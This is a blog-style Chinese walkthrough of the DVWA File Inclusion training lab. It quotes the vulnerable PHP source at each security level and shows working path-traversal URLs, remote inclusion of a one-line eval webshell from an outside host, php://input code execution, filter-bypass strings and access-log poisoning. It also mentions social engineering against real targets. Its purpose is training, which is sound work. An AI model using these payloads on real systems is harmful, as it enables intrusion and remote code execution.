---
layout: post
title: "DVWA File Inclusion"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_File_Inclusion
author: ""
tags: ['DVWA', 'File_Inclusion']
---



# DVWA File Inclusion

###### tags: `DVWA`



file inclusion 文件包含可以分為兩種，一種是本地，一種是遠程

這種題目:
會需要php.ini 打開以下兩個

* PHP function allow_url_include: Enabled
* PHP function allow_url_fopen: Enabled




# Low


進入頁面選擇 [file1.php] 

url 
```
http://localhost/vulnerabilities/fi/?page=file1.php
```

code:

low:
* 沒過濾

```php=

<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>

```






index.php
```php=
<?php

define( 'DVWA_WEB_PAGE_TO_ROOT', '../../' );
require_once DVWA_WEB_PAGE_TO_ROOT . 'dvwa/includes/dvwaPage.inc.php';

dvwaPageStartup( array( 'authenticated', 'phpids' ) );

$page = dvwaPageNewGrab();
$page[ 'title' ]   = 'Vulnerability: File Inclusion' . $page[ 'title_separator' ].$page[ 'title' ];
$page[ 'page_id' ] = 'fi';
$page[ 'help_button' ]   = 'fi';
$page[ 'source_button' ] = 'fi';

dvwaDatabaseConnect();

$vulnerabilityFile = '';
switch( $_COOKIE[ 'security' ] ) {
	case 'low':
		$vulnerabilityFile = 'low.php';
		break;
	case 'medium':
		$vulnerabilityFile = 'medium.php';
		break;
	case 'high':
		$vulnerabilityFile = 'high.php';
		break;
	default:
		$vulnerabilityFile = 'impossible.php';
		break;
}

require_once DVWA_WEB_PAGE_TO_ROOT . "vulnerabilities/fi/source/{$vulnerabilityFile}";

// if( count( $_GET ) )
if( isset( $file ) )
	include( $file );
else {
	header( 'Location:?page=include.php' );
	exit;
}

dvwaHtmlEcho( $page );

?>

```

只判斷了有沒有 file 就 inlcude 了
```php=
if( isset( $file ) )
	include( $file );
```


所以這種利用很簡單。
<br/><br/>

### 包含本地文件
* linux:
猜出/etc/passwd這個文件，至於../ 有幾層 你可以用burpsuite跑
```
http://localhost/vulnerabilities/fi/?page=../../../etc/passwd
```



* windows
直接C:\Windows\System32\drivers\etc\hosts
```
http://localhost/vulnerabilities/fi/?page=C:\Windows\System32\drivers\etc\hosts
```


### 遠程文件包含
這種就可怕了，可以直接寫一個一句話木馬。

* 小提醒:
我這邊換網域www.dvwa.com，為了測試。



* hacker site: 
http://www.k.com/hack.txt
```=
1111111
<?php @eval($_POST[x]); ?>

```

* payload url 
```
http://www.dvwa.com/vulnerabilities/fi/?page=http://www.k.com/hack.php
```


拿出中國蟻劍連一下，可以成功。

* !這裡我換 .php就不成功，不知道是不是不解析 php檔 

<br/><br/>

### 還可以用php偽協議:

* php://input



* 打開BP，改url
```
http://www.dvwa.com/vulnerabilities/fi/?page=php://input
```


* 抓包放上post數據:
```
<?php phpinfo();?>
```


```http=
GET /vulnerabilities/fi/?page=php://input HTTP/1.1
Host: www.dvwa.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=432djeae29soff0qvj2mcgties; security=low
Upgrade-Insecure-Requests: 1

<?php phpinfo();?>
```

發過去就會成功執行。

偽協議還有一大堆，有興趣可以自行搜索。

<br/><br/><br/><br/>


# Medium

code:



```php=
<?php

// The page we wish to display
$file = $_GET[ 'page' ];



/* 
 * 
字串http://轉空
字串https://轉空
../ 轉空
..\ 轉空

*/
// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );

?> 


```

這種轉空的，如果是字串，就有機會被繞過，最好設定為字元，不然就是出現就過濾。


```
http://www.k.com/hack.txt

雙寫繞過 成功
httphttp://://www.k.com/hack.txt

大小寫繞過 成功
Http://www.k.com/hack.txt

```

本地我就不測了，原理一樣，在不行也可以用偽協議。


<br/><br/>


# High:

code:

*只允許 file 開頭的檔案或是 include.php

```php=


<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?>


```



這邊我們只剩下一個本地的協議可以用:


```
file:///xxxx
```


我這邊換環境，phpstudy 的 log 防禦還蠻強的。
我改MAMP 搭建。


MAMP的登入log位置
```
C:\MAMP\logs\access.log
```

至於真實攻擊場景，你可以社工套出，他使用啥環境架設的。
或是你去暴力猜測。


打開access.log 可以看見一堆請求，這時你可以請求

```
http://localhost/<?php phpinfo();?>
```


看見log 記錄了，但是被url encode:
```
127.0.0.1 - - [31/Jan/2023:17:13:05 +0800] "GET /%3C?php%20phpinfo();?%3E HTTP/1.1" 403 206
127.0.0.1 - - [31/Jan/2023:17:13:05 +0800] "GET /robots.txt HTTP/1.1" 200 26

```



bp:

```
GET /<?php phpinfo();?> HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=6a42f1884fd05429ad3244e4a1190e46; security=high
Upgrade-Insecure-Requests: 1


```

access.log
```
127.0.0.1 - - [31/Jan/2023:17:16:35 +0800] "GET /<?php phpinfo();?> HTTP/1.1" 403 206
```



```
C:\MAMP\logs\access.log

file 協議:
file:///C:/MAMP/logs/access.log

```


```
http://localhost/vulnerabilities/fi/?page=file:///C:/MAMP/logs/access.log

```

暴出了: phpinfo 所以基本上，可以為所欲為了

<br/><br/>

# Impossible

code:

白名單 不給機會。
```php=
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
} 
```

















































